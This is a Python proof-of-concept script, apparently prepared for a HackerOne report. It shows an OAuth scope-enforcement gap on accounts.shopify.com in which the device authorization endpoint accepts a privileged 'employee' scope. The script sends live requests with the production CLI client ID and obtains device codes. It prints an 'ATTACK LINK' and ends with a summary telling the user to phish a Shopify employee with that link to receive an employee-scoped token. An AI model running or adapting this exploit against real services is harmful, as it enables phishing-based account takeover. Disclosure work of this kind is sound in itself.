#!/usr/bin/env python3
"""
Proof of Concept: OAuth Device Authorization Scope Bypass on accounts.shopify.com
Vulnerability: employee scope accepted by /oauth/device_authorization but rejected
               by /oauth/authorize — inconsistent scope enforcement.

Author: tanmaymish78@gmail.com
Target: accounts.shopify.com (Core scope, HackerOne Shopify program)
Date:   2026-07-01
"""

import requests, json, sys, time
from datetime import datetime, timezone

TARGET     = "https://accounts.shopify.com"
CLIENT_ID  = "fbdb2649-e327-4907-8f67-908d24cfd7e3"   # Shopify CLI production client
PRIV_SCOPE = "employee"                                 # Privileged internal scope
SAFE_SCOPE = "openid"

HEADERS = {
    "User-Agent": "ShopifyCLI/3.67.0 Node.js/20.x",
    "Accept": "application/json",
}

SEP = "=" * 70

def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def print_section(title):
    print(f"\n{SEP}")
    print(f"  {title}")
    print(SEP)

def run_oidc():
    print_section("STEP 1 — OIDC Discovery: confirm employee scope + grant types")
    url = f"{TARGET}/.well-known/openid-configuration"
    print(f"[{ts()}] GET {url}")
    r = requests.get(url, headers=HEADERS, timeout=10)
    d = r.json()
    scopes = d.get("scopes_supported", [])
    grants = d.get("grant_types_supported", [])
    dev_ep = d.get("device_authorization_endpoint", "NOT IN DISCOVERY DOC")
    print(f"HTTP {r.status_code}")
    print(f"scopes_supported:              {scopes}")
    print(f"grant_types_supported:         {grants}")
    print(f"device_authorization_endpoint: {dev_ep}")
    assert "employee" in scopes, "employee scope not found — check target"
    print("\n[CONFIRMED] 'employee' is a real scope in the authorization server.")
    print("[NOTE] device_code grant NOT in grant_types_supported (undocumented endpoint)")
    return scopes, grants

def run_authcode_reject():
    print_section("STEP 2 — authorization_code flow: REJECTS employee scope (baseline)")
    import urllib.parse
    code_challenge = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
    params = {
        "response_type": "code",
        "client_id":     CLIENT_ID,
        "scope":         PRIV_SCOPE,
        "redirect_uri":  "http://127.0.0.1:3456",
        "state":         "csrf_poc_test",
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
    }
    url = f"{TARGET}/oauth/authorize"
    qs  = urllib.parse.urlencode(params)
    print(f"[{ts()}] GET {url}")
    print(f"         ?{qs}")
    r = requests.get(url, params=params,
                     headers={"User-Agent": "Mozilla/5.0", "Accept": "text/html"},
                     allow_redirects=False, timeout=10)
    loc = r.headers.get("Location", "")
    print(f"HTTP {r.status_code}")
    print(f"Location: {loc}")
    if "error=invalid_scope" in loc:
        print("\n[CONFIRMED] authorization_code flow correctly returns invalid_scope.")
        return True
    else:
        print("\n[UNEXPECTED] authorization_code did not return invalid_scope!")
        return False

def run_device_auth(scope=PRIV_SCOPE):
    url = f"{TARGET}/oauth/device_authorization"
    data = {"client_id": CLIENT_ID, "scope": scope}
    print(f"[{ts()}] POST {url}")
    print(f"         Body: client_id={CLIENT_ID}&scope={scope}")
    r = requests.post(url, data=data, headers=HEADERS, timeout=10)
    print(f"HTTP {r.status_code}")
    try:
        body = r.json()
    except Exception:
        body = {"raw": r.text[:500]}
    print(json.dumps(body, indent=4))
    return r.status_code, body

def run_device_bypass():
    print_section("STEP 3 — device_authorization flow: ACCEPTS employee scope (VULNERABILITY)")
    status, body = run_device_auth(PRIV_SCOPE)
    if status == 200 and "user_code" in body:
        print(f"\n[VULNERABILITY CONFIRMED] Server returned user_code for scope='{PRIV_SCOPE}'")
        print(f"  user_code:                {body['user_code']}")
        print(f"  device_code:              {body['device_code']}")
        print(f"  expires_in:               {body['expires_in']}s")
        print(f"  verification_uri:         {body['verification_uri']}")
        print(f"  verification_uri_complete:{body['verification_uri_complete']}")
        print(f"\n[ATTACK LINK] Send this legitimate accounts.shopify.com URL to target:")
        print(f"  {body['verification_uri_complete']}")
        return body
    else:
        print(f"\n[NOT VULNERABLE or endpoint changed] HTTP {status}")
        return None

def run_poll(device_code):
    print_section("STEP 4 — Polling confirms device_code is LIVE and awaiting authorization")
    url = f"{TARGET}/oauth/token"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": CLIENT_ID,
    }
    print(f"[{ts()}] POST {url}")
    print(f"         grant_type=device_code&device_code={device_code[:12]}...&client_id={CLIENT_ID}")
    r = requests.post(url, data=data, headers=HEADERS, timeout=10)
    body = r.json()
    print(f"HTTP {r.status_code}")
    print(json.dumps(body, indent=4))
    if body.get("error") == "authorization_pending":
        print("\n[CONFIRMED] Code is LIVE — waiting for victim to authorize at:")
        print(f"  https://accounts.shopify.com/activate-with-code")
        print(f"  Once victim authorizes → attacker receives employee-scoped access_token")
    return body

def run_comparison():
    print_section("STEP 5 — Scope comparison: what is accepted vs rejected")
    results = {}
    test_scopes = ["employee", "legacy", "openid", "email", "employee openid"]
    for scope in test_scopes:
        time.sleep(0.4)
        status, body = run_device_auth(scope)
        if status == 200 and "user_code" in body:
            results[scope] = f"ACCEPTED  → user_code={body['user_code']}"
        else:
            err = body.get("error", "?")
            results[scope] = f"REJECTED  → error={err}"
    print("\n  Scope comparison table:")
    print(f"  {'SCOPE':<25} {'RESULT'}")
    print(f"  {'-'*25} {'-'*40}")
    for scope, result in results.items():
        print(f"  {scope:<25} {result}")

def main():
    print(f"""
{SEP}
  PoC: OAuth Device Authorization Scope Bypass
  Target: accounts.shopify.com (Shopify HackerOne — Core scope)
  Scope Tested: 'employee' (internal privileged scope)
  Date: {ts()}
{SEP}
""")
    # Run all evidence steps
    scopes, grants = run_oidc()

    time.sleep(1)
    authcode_ok = run_authcode_reject()

    time.sleep(1)
    device_body = run_device_bypass()

    if device_body and "device_code" in device_body:
        time.sleep(1)
        run_poll(device_body["device_code"])

    time.sleep(1)
    run_comparison()

    print_section("SUMMARY")
    print(f"""
  VULNERABILITY: Inconsistent scope enforcement between OAuth flows

  /oauth/authorize (authorization_code):
    scope=employee → HTTP 302, error=invalid_scope  ✓ (correct)

  /oauth/device_authorization (device_code):
    scope=employee → HTTP 200, user_code returned   ✗ (BYPASS)

  ATTACK:
    1. POST /oauth/device_authorization with scope=employee
    2. Receive verification_uri_complete (pre-filled accounts.shopify.com URL)
    3. Phish Shopify employee with that URL
    4. Employee clicks → authorizes the device
    5. Attacker polls /oauth/token → receives employee-scoped token

  IMPACT:
    - employee scope = internal Shopify access
    - No authentication required to initiate the attack
    - Pre-filled magic link lowers phishing friction significantly
    - No rate limiting on device_authorization endpoint

  CLIENT ID SOURCE (public GitHub):
    https://github.com/Shopify/cli/blob/main/packages/cli-kit/src/private/node/session/identity.ts
    Production client_id = fbdb2649-e327-4907-8f67-908d24cfd7e3

  Reported to: HackerOne Shopify program
  Reporter:    tanmaymish78@gmail.com
""")

if __name__ == "__main__":
    main()
